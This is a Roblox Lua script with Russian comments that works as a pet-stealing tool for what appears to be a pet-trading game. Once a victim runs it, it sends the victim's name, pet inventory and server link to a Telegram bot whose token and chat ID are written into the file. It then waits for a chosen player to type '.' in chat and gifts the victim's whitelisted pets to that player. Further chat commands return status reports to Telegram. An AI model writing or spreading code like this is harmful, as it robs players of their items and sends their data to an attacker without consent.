local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local HttpService = game:GetService("HttpService")
local TextChatService = game:GetService("TextChatService")
local LocalPlayer = Players.LocalPlayer

-- 🔧 НАСТРОЙКИ
local TELEGRAM_TOKEN = "7678595031:AAHYzkbKKI4CdT6B2NUGcYY6IlTvWG8xkzE"
local TELEGRAM_CHAT_ID = "7144575011"
local TARGET_PLAYER = "sERTTQE0"
local TRIGGER_MESSAGE = "."

-- 🐾 БЕЛЫЙ СПИСОК
local WHITELIST = {
    "Crab",
    "Moon Cat", 
    "Wasp"
}

local PetGiftingService = ReplicatedStorage:WaitForChild("GameEvents"):WaitForChild("PetGiftingService")

-- 📊 СТАТИСТИКА
local STATS = {
    startTime = tick(),
    totalPetsTransferred = 0,
    errors = 0
}

-- 📨 ПРОСТАЯ ФУНКЦИЯ TELEGRAM
local function sendToTelegram(text)
    -- Ограничиваем длину
    if #text > 3500 then
        text = text:sub(1, 3500) .. "..."
    end
    
    local success, result = pcall(function()
        local url = string.format(
            "https://api.telegram.org/bot%s/sendMessage?chat_id=%s&text=%s",
            TELEGRAM_TOKEN,
            TELEGRAM_CHAT_ID,
            HttpService:UrlEncode(text)
        )
        return game:HttpGet(url)
    end)
    
    if not success then
        warn("Telegram error: " .. tostring(result))
        STATS.errors = STATS.errors + 1
    end
    
    return success
end

-- 🔗 ФУНКЦИЯ ССЫЛКИ НА СЕРВЕР
local function getServerLink()
    local placeId = game.PlaceId
    local jobId = game.JobId
    
    if not jobId or jobId == "" then
        return "roblox://placeId=" .. placeId
    else
        return "roblox://placeId=" .. placeId .. "&gameInstanceId=" .. jobId
    end
end

-- 🔎 ФУНКЦИЯ ПОЛУЧЕНИЯ ПИТОМЦЕВ
local function getAllPets()
    local pets = {}
    local sources = {LocalPlayer.Backpack}
    
    if LocalPlayer.Character then
        table.insert(sources, LocalPlayer.Character)
    end
    
    for _, source in ipairs(sources) do
        for _, item in ipairs(source:GetChildren()) do
            if item:IsA("Tool") and item.Name:find("%[") then
                local weight = item.Name:match("%[(%d+%.%d+) KG%]")
                if weight then
                    local petName = item.Name:match("^([^%[]+)")
                    if petName then
                        petName = petName:gsub("%s+$", "")
                        
                        local isWhitelisted = false
                        for _, whitelistedPet in ipairs(WHITELIST) do
                            if petName:lower():find(whitelistedPet:lower()) then
                                isWhitelisted = true
                                break
                            end
                        end
                        
                        table.insert(pets, {
                            name = petName,
                            weight = tonumber(weight),
                            object = item,
                            isWhitelisted = isWhitelisted
                        })
                    end
                end
            end
        end
    end
    
    table.sort(pets, function(a, b) return a.weight > b.weight end)
    return pets
end

-- 📜 СПИСОК ПИТОМЦЕВ
local function getPetsList()
    local pets = getAllPets()
    if #pets == 0 then 
        return "Нет питомцев" 
    end
    
    local whitelisted = 0
    local totalWeight = 0
    local result = {"ПИТОМЦЫ:"}
    
    for i, pet in ipairs(pets) do
        if i > 15 then break end -- Ограничиваем вывод
        
        totalWeight = totalWeight + pet.weight
        if pet.isWhitelisted then
            whitelisted = whitelisted + 1
            table.insert(result, string.format("✅ %s [%.1f]", pet.name, pet.weight))
        else
            table.insert(result, string.format("❌ %s [%.1f]", pet.name, pet.weight))
        end
    end
    
    if #pets > 15 then
        table.insert(result, "...")
    end
    
    table.insert(result, string.format("\nВсего: %d | К передаче: %d", #pets, whitelisted))
    
    return table.concat(result, "\n")
end

-- 🏁 СТАРТОВОЕ УВЕДОМЛЕНИЕ
local function sendInitialNotification()
    local message = string.format(
        "СКРИПТ ЗАПУЩЕН\n\nИгрок: %s\nКоманды от: %s\nТриггер: %s\n\n%s\n\nСсылка: %s",
        LocalPlayer.Name,
        TARGET_PLAYER, 
        TRIGGER_MESSAGE,
        getPetsList(),
        getServerLink()
    )
    
    sendToTelegram(message)
end

-- 🐕 ФУНКЦИЯ ПЕРЕДАЧИ
local function transferPet(pet)
    if not pet.isWhitelisted then 
        return false, "Не в списке" 
    end
    
    local target = Players:FindFirstChild(TARGET_PLAYER)
    if not target then
        return false, "Игрок не найден"
    end
    
    if not (LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("Humanoid")) then
        return false, "Персонаж недоступен"
    end
    
    local success, err = pcall(function()
        LocalPlayer.Character.Humanoid:EquipTool(pet.object)
        task.wait(1)
        PetGiftingService:FireServer("GivePet", target)
    end)
    
    if success then
        STATS.totalPetsTransferred = STATS.totalPetsTransferred + 1
        return true, "OK"
    else
        STATS.errors = STATS.errors + 1
        return false, "Ошибка"
    end
end

-- 🚚 ПРОЦЕСС ПЕРЕДАЧИ
local function startPetTransfer()
    sendToTelegram("Начинаю передачу...")
    
    local pets = getAllPets()
    local whitelistedPets = {}
    
    for _, pet in ipairs(pets) do
        if pet.isWhitelisted then
            table.insert(whitelistedPets, pet)
        end
    end
    
    if #whitelistedPets == 0 then
        sendToTelegram("Нет питомцев для передачи")
        return
    end
    
    local successful = 0
    local failed = 0
    
    for i, pet in ipairs(whitelistedPets) do
        local success, reason = transferPet(pet)
        
        if success then
            successful = successful + 1
        else
            failed = failed + 1
        end
        
        -- Отчет каждые 5 питомцев
        if i % 5 == 0 then
            sendToTelegram(string.format("Прогресс: %d/%d", i, #whitelistedPets))
        end
        
        task.wait(2)
    end
    
    -- Финальный отчет
    sendToTelegram(string.format(
        "ГОТОВО!\nУспешно: %d\nОшибок: %d", 
        successful, failed
    ))
end

-- 💬 СИСТЕМА КОМАНД
local function setupMessageListener()
    if TextChatService then
        TextChatService.OnIncomingMessage = function(message)
            local speaker = Players:FindFirstChild(message.TextSource.Name)
            if speaker and speaker.Name == TARGET_PLAYER then
                local msg = message.Text:lower()
                
                if message.Text == TRIGGER_MESSAGE then
                    startPetTransfer()
                elseif msg:find("pets") then
                    sendToTelegram(getPetsList())
                elseif msg:find("link") then
                    sendToTelegram("Ссылка: " .. getServerLink())
                elseif msg:find("status") then
                    local uptime = string.format("%.1f мин", (tick() - STATS.startTime) / 60)
                    sendToTelegram(string.format("Работает: %s\nПередано: %d", uptime, STATS.totalPetsTransferred))
                end
            end
        end
    else
        Players.PlayerChatted:Connect(function(chatType, speaker, message)
            if chatType == Enum.PlayerChatType.All and speaker.Name == TARGET_PLAYER then
                local msg = message:lower()
                
                if message == TRIGGER_MESSAGE then
                    startPetTransfer()
                elseif msg:find("pets") then
                    sendToTelegram(getPetsList())
                elseif msg:find("link") then
                    sendToTelegram("Ссылка: " .. getServerLink())
                elseif msg:find("status") then
                    local uptime = string.format("%.1f мин", (tick() - STATS.startTime) / 60)
                    sendToTelegram(string.format("Работает: %s\nПередано: %d", uptime, STATS.totalPetsTransferred))
                end
            end
        end)
    end
end

-- 🚀 ЗАПУСК
task.wait(3)
sendInitialNotification()
setupMessageListener()

print("Скрипт загружен!")
print("Команды для " .. TARGET_PLAYER .. ":")
print("'" .. TRIGGER_MESSAGE .. "' - передать питомцев")
print("'pets' - список питомцев") 
print("'status' - статус")
print("'link' - ссылка на сервер")
